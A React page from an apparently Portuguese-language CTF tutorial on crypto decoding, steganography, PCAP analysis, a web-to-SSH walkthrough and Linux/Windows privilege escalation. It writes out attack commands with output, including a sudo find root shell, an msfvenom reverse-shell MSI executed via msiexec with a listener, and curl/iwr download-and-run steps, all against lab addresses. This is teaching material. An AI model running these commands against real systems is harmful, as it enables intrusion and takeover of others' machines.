import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { OutputBlock } from "@/components/ui/OutputBlock";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

const platforms = [
  { name: "Hack The Box (HTB)", url: "hackthebox.com", level: "★★★★", desc: "Máquinas reais para hackear. Padrão da indústria." },
  { name: "TryHackMe (THM)", url: "tryhackme.com", level: "★★", desc: "Ideal para iniciantes. Guiado e com teoria." },
  { name: "PicoCTF", url: "picoctf.org", level: "★★", desc: "Para estudantes. Desafios bem explicados." },
  { name: "CTFtime", url: "ctftime.org", level: "★★★", desc: "Calendário de CTFs globais e rankings." },
  { name: "PortSwigger Web Academy", url: "portswigger.net/web-security", level: "★★★", desc: "Labs de pentest web gratuitos." },
  { name: "OverTheWire", url: "overthewire.org", level: "★★", desc: "Wargames via SSH. Ótimo para Linux." },
  { name: "VulnHub", url: "vulnhub.com", level: "★★★", desc: "VMs para baixar e hackear offline." },
  { name: "Root-Me", url: "root-me.org", level: "★★★", desc: "Plataforma francesa com muitos desafios." },
];

export default function CTF() {
  return (
    <PageContainer
      title="CTF — Capture The Flag"
      subtitle="Como funcionam os desafios, quais categorias existem e como abordar cada uma com ferramentas reais."
      difficulty="intermediario"
      timeToRead="16 min"
      prompt="ctf"
    >
      <h2>O que é CTF</h2>
      <p>
        Competição onde participantes resolvem desafios para encontrar <strong>flags</strong> —
        strings secretas no formato <code>{"FLAG{exemplo_aqui}"}</code> ou <code>{"HTB{texto}"}</code>.
        É a forma mais rápida (e legal) de aprender hacking ofensivo.
      </p>

      <h2>Plataformas para praticar</h2>
      <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 my-6">
        {platforms.map((p, i) => (
          <div key={i} className="bg-card border border-border rounded-xl p-4">
            <div className="flex justify-between items-start">
              <div className="font-bold text-sm text-foreground">{p.name}</div>
              <span className="text-xs text-primary">{p.level}</span>
            </div>
            <div className="text-xs text-muted-foreground mt-1">{p.url}</div>
            <p className="text-xs text-muted-foreground mt-2">{p.desc}</p>
          </div>
        ))}
      </div>

      <h2>Categorias clássicas</h2>
      <CommandTable
        title="O que esperar em cada categoria"
        variations={[
          { cmd: "Web", desc: "SQLi, XSS, SSRF, IDOR, JWT, RCE, deserialization, CSRF.", output: "Burp Suite + sqlmap + manual." },
          { cmd: "Crypto", desc: "RSA fraco, AES ECB, Caesar, Vigenère, hash collision.", output: "openssl, sage, hashcat, CyberChef." },
          { cmd: "Pwn (binary)", desc: "Buffer overflow, ROP, format string, heap.", output: "gdb, pwntools, radare2, ghidra." },
          { cmd: "Reversing", desc: "Decompilar ELF/PE, anti-debug, packers.", output: "ghidra, ida free, x64dbg, frida." },
          { cmd: "Forensics", desc: "PCAP, disco, RAM, esteganografia.", output: "wireshark, volatility, autopsy, binwalk." },
          { cmd: "OSINT", desc: "Geolocalizar foto, EXIF, redes sociais.", output: "exiftool, sherlock, google reverse." },
          { cmd: "Misc", desc: "Encoding exótico (brainfuck, jsfuck).", output: "Caso por caso. Ler com calma." },
          { cmd: "Stego", desc: "Dado escondido em img/áudio/PDF.", output: "steghide, zsteg, stegseek, exiftool." },
        ]}
      />

      <h2>Crypto — kit básico</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "base64",
            cmd: "echo 'aGVsbG8gd29ybGQ=' | base64 -d",
            out: "hello world",
            outType: "info",
          },
          {
            comment: "hex",
            cmd: "echo '68656c6c6f' | xxd -r -p",
            out: "hello",
            outType: "default",
          },
          {
            comment: "ROT13 / Caesar",
            cmd: "echo 'uryyb jbeyq' | tr 'A-Za-z' 'N-ZA-Mn-za-m'",
            out: "hello world",
            outType: "info",
          },
          {
            comment: "brute Caesar (todas as 25 rotações)",
            cmd: `python3 -c "s='khoor'; [print(f'{i:2}:', ''.join(chr((ord(c)-97-i)%26+97) if c.isalpha() else c for c in s)) for i in range(26)]"`,
            out: ` 0: khoor
 1: jgnnq
 2: ifmmp
 3: hello       ← achou!
 4: gdkkn
 [...]`,
            outType: "warning",
          },
          {
            comment: "RSA — small e + small N → factordb.com",
            cmd: "python3 -c 'from Crypto.PublicKey import RSA; k=RSA.import_key(open(\"key.pem\").read()); print(f\"n={k.n} e={k.e}\")'",
            out: `n=24372849823104872308472304823048320934...
e=65537`,
            outType: "muted",
          },
        ]}
      />

      <h2>Esteganografia</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "1) sempre comece com strings + file + exiftool",
            cmd: "file challenge.jpg && exiftool challenge.jpg | head -10",
            out: `challenge.jpg: JPEG image data, JFIF standard 1.01
ExifTool Version Number  : 12.76
File Size                : 142 KiB
File Modification Date/T : 2026:04:03 22:14:21
Image Width              : 1920
Comment                  : ZmxhZ3tlc3RlZ19uYV9leGlmfQ==           ← base64!`,
            outType: "warning",
          },
          {
            cmd: "echo 'ZmxhZ3tlc3RlZ19uYV9leGlmfQ==' | base64 -d",
            out: "flag{esteg_na_exif}",
            outType: "success",
          },
          {
            comment: "2) steghide (com senha)",
            cmd: "steghide extract -sf foto.jpg -p senha123",
            out: `wrote extracted data to "secret.txt".`,
            outType: "info",
          },
          {
            comment: "3) stegseek (brute force de senha)",
            cmd: "stegseek foto.jpg /usr/share/wordlists/rockyou.txt",
            out: `StegSeek 0.6 - https://github.com/RickdeJager/stegseek

[i] Found passphrase: "passw0rd"
[i] Original filename: "flag.txt".
[i] Extracting to "foto.jpg.out".`,
            outType: "success",
          },
          {
            comment: "4) binwalk — arquivos embutidos",
            cmd: "binwalk arquivo.png && binwalk -e arquivo.png",
            out: `DECIMAL  HEXADECIMAL   DESCRIPTION
0        0x0           PNG image, 800 x 600, 8-bit/color RGBA
1842     0x732         Zlib compressed data, default compression
142841   0x22DF9       Zip archive data, at least v2.0 to extract
142899   0x22E33         flag.txt          ← arquivo escondido no PNG!`,
            outType: "warning",
          },
          {
            comment: "5) zsteg para PNG/BMP (LSB)",
            cmd: "zsteg -a flag.png",
            out: `b1,r,lsb,xy        .. text: "flag{lsb_simples}"
b1,bgr,lsb,xy      .. <wbStego size=128>
b2,b,msb,xy        .. file: PGP key`,
            outType: "success",
          },
        ]}
      />

      <h2>Forensics — PCAP</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "capinfos challenge.pcap | head",
            out: `File name:          challenge.pcap
File type:          Wireshark/tcpdump - pcap
Number of packets:  18,231
Capture duration:   312.41 seconds
Average pkt rate:   58 packets/s`,
            outType: "info",
          },
          {
            cmd: "tshark -r challenge.pcap -Y 'http.request' -T fields -e ip.src -e http.request.method -e http.request.full_uri | head",
            out: `192.168.1.50  POST  http://attacker.com/upload
192.168.1.50  GET   http://10.0.0.5/admin/login.php
192.168.1.50  POST  http://10.0.0.5/admin/login.php
192.168.1.50  GET   http://10.0.0.5/admin/dashboard.php`,
            outType: "warning",
          },
          {
            comment: "extrair credenciais POST",
            cmd: "tshark -r challenge.pcap -Y 'http.request.method == POST' -T fields -e urlencoded-form.value | head",
            out: `username=admin
password=Senha2025!@#
login=Submit
flag=flag{captured_in_pcap}`,
            outType: "success",
          },
          {
            comment: "extrair arquivos transferidos",
            cmd: "tshark -r challenge.pcap --export-objects http,/tmp/objetos && ls /tmp/objetos",
            out: `index.html
upload.php
flag.zip                 ← bingo!
admin.css
jquery-3.6.0.min.js`,
            outType: "info",
          },
          {
            comment: "follow TCP stream específico",
            cmd: "tshark -r challenge.pcap -q -z follow,tcp,ascii,5",
            out: `===================================================================
Follow: tcp,ascii  Stream: 5
Node 0: 192.168.1.50:42158
Node 1: 10.0.0.5:80
        GET /flag.txt HTTP/1.1
        Host: 10.0.0.5

        HTTP/1.1 200 OK
        Content-Length: 28

        flag{tcp_stream_extraction}
===================================================================`,
            outType: "success",
          },
        ]}
      />

      <h2>Web — pipeline para HTB/THM</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "1) recon completo",
            cmd: "nmap -sC -sV -p- --min-rate=1000 -T4 10.10.10.50 -oA scan",
            out: `PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1
80/tcp   open  http     Apache httpd 2.4.51
8080/tcp open  http     Tomcat/Coyote JSP engine`,
            outType: "info",
          },
          {
            cmd: "gobuster dir -u http://10.10.10.50 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50",
            out: `===============================================================
/index.html           (Status: 200) [Size: 1284]
/uploads              (Status: 301)            ← upload!
/admin                (Status: 401)
/backup               (Status: 200) [Size: 142]
/.git                 (Status: 301)            ← .git exposto!
/api                  (Status: 200) [Size: 73]
/api/users.php        (Status: 200) [Size: 4214]
===============================================================`,
            outType: "warning",
          },
          {
            cmd: "git clone http://10.10.10.50/.git/ /tmp/loot && cd /tmp/loot && git log --oneline",
            out: `Cloning into '/tmp/loot'...
remote: Counting objects: done.

bcd1e42 (HEAD -> master) update admin login
a7f3819 add backup script
3f94c0e remove dev secrets   ← ihhh!`,
            outType: "warning",
          },
          {
            cmd: "git show 3f94c0e",
            out: `commit 3f94c0e0a82bd14e84572fa9e8c3a2f1e6d7b9c5
Author: dev <dev@empresa.com>
Date:   Mon Jan 14 14:21:42 2026 -0300

    remove dev secrets

diff --git a/config.php b/config.php
-define('DB_PASS', 'Welcome2025@DB');           ← credencial!
-define('API_KEY', 'sk-prod-abc123xyz789');     ← API key!
+define('DB_PASS', getenv('DB_PASS'));`,
            outType: "error",
          },
          {
            comment: "agora usar credenciais para SSH/admin",
            cmd: "ssh dev@10.10.10.50",
            out: `dev@10.10.10.50's password: Welcome2025@DB

Linux box 5.15.0 ...
dev@box:~$ id
uid=1000(dev) gid=1000(dev) groups=1000(dev)
dev@box:~$ ls
user.txt    ← FLAG do user!
dev@box:~$ cat user.txt
HTB{git_log_secrets_exposed}`,
            outType: "success",
          },
        ]}
      />

      <h2>Privesc — Linux</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "linpeas em 1 linha (sem deixar arquivo)",
            cmd: "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh | tee /tmp/peas.out",
            out: `╔══════════╣ Privilege Escalation Path
[+] [CVE-2022-0847] DirtyPipe                ← KERNEL VULN
[+] sudo -l: NOPASSWD entry for /usr/bin/find ← privesc trivial!
[+] /etc/cron.d/backup is world-writable
[+] Suspicious SUID: /usr/local/bin/runner
[+] Capabilities: /usr/bin/python3 = cap_setuid+ep`,
            outType: "warning",
          },
          {
            cmd: "sudo -l",
            out: `(root) NOPASSWD: /usr/bin/find`,
            outType: "info",
          },
          {
            cmd: "sudo /usr/bin/find . -exec /bin/sh \\; -quit",
            out: `# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
HTB{nopasswd_find_gtfobins}`,
            outType: "error",
          },
        ]}
      />

      <h2>Privesc — Windows</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "winpeas em PowerShell",
            cmd: "(no alvo Windows) iwr http://10.10.14.42/winPEASany.exe -O winpeas.exe; .\\winpeas.exe",
            out: `╔══════════╣ Looking for AlwaysInstallElevated
HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated = 1   ← privesc!
HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated = 1

╔══════════╣ Stored Credentials
cmdkey: domain\\Administrator → Senha@2025!

╔══════════╣ Unquoted Service Paths
[!] BadService: C:\\Program Files\\Bad App\\service.exe   ← writable!`,
            outType: "warning",
          },
          {
            comment: "explorar AlwaysInstallElevated",
            cmd: "msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.42 LPORT=4444 -f msi -o /tmp/x.msi",
            out: `Payload size: 7168 bytes
Final size of msi file: 159744 bytes
Saved as: /tmp/x.msi`,
            outType: "info",
          },
          {
            cmd: "(no alvo) msiexec /quiet /qn /i x.msi",
            out: "(callback no listener)",
            outType: "default",
          },
          {
            cmd: "(no listener) ",
            out: `Connection received on 10.10.10.50 51842
nt authority\\system

C:\\Windows\\system32> type C:\\Users\\Administrator\\Desktop\\root.txt
HTB{always_install_elevated_win}`,
            outType: "error",
          },
        ]}
      />

      <h2>Dicas que ganham CTF</h2>
      <OutputBlock label="lessons learned de quem ganha" type="info">
{`1. LEIA o desafio com calma. O nome muitas vezes é a dica.
   "Caesar's Salad"   → Caesar cipher
   "Easy as RSA"      → RSA com fraqueza específica
   "FACTORize this"   → factordb.com

2. Sempre rode 'file' e 'strings' ANTES de ferramentas pesadas.
   Metade dos challenges easy se resolvem aí.

3. Em web, use Burp em TUDO. Inspecione cookies, headers, ordem.

4. Em pwn, identifique proteções primeiro:
   checksec --file=binario
   (NX, ASLR, PIE, Stack canary, RELRO)

5. Documente conforme avança (Obsidian, CherryTree). Você VAI esquecer.

6. Em time, divida por categoria (web/crypto/pwn/forensics).
   Comunique flags na hora.

7. Se travou 30min, mude de challenge. Volte mais tarde com cabeça limpa.

8. Leia writeups de CTFs PASSADOS — você aprende padrões que se repetem.

9. ippsec.rocks (busca em vídeos do IppSec por técnica) — INSANO.

10. Tenha um cheatsheet pessoal no Obsidian organizado por categoria.`}
      </OutputBlock>

      <PracticeBox
        title="Resolva picoCTF 'General Skills' (1h)"
        goal="Pegar 5 flags em 1h fazendo categoria 'General Skills' do picoCTF (gratuito, com hints)."
        steps={[
          "Crie conta em play.picoctf.org.",
          "Filtre 'General Skills' / 'easy'.",
          "Pegue 5: Obedient Cat, python wrangling, what's a netcat, nice netcat, strings it.",
          "Resolva cada uma com mínimo de hint.",
          "Documente em Obsidian o que usou + comandos.",
        ]}
        command={`# Obedient Cat — só baixar e cat
wget https://challenge-files.picoctf.net/c_titan/.../flag
cat flag

# Python wrangling — descriptografa Python script
wget https://.../ende.py https://.../pw.txt https://.../flag.txt.en
python3 ende.py -d flag.txt.en

# what's a netcat — conecta com nc
nc tethys.picoctf.net 65174

# strings it — strings + grep
strings strings | grep picoCTF`}
        expected={`picoCTF{s4n1ty_v3r1f13d_xxxxxxxx}
picoCTF{4_d3rp_4_d3rp_5tr1ng5_5tr1ngz_xxxxxxxx}
picoCTF{REPLACE_ME}
[...]`}
        verify="Anote em arquivo do Obsidian: Categoria, Nome, 1 frase 'o que aprendi'. Em 1 mês você terá um cheatsheet pessoal valioso."
      />

      <AlertBox type="success" title="CTF é o caminho mais rápido para ficar bom">
        Cada challenge é uma técnica isolada — você não fica perdido em recon de produção real.
        Paretto: 80% do que cai em pentest profissional é técnica que você já viu em CTF.
        Faça 3 challenges/dia por 6 meses e estará pronto para OSCP.
      </AlertBox>
    </PageContainer>
  );
}
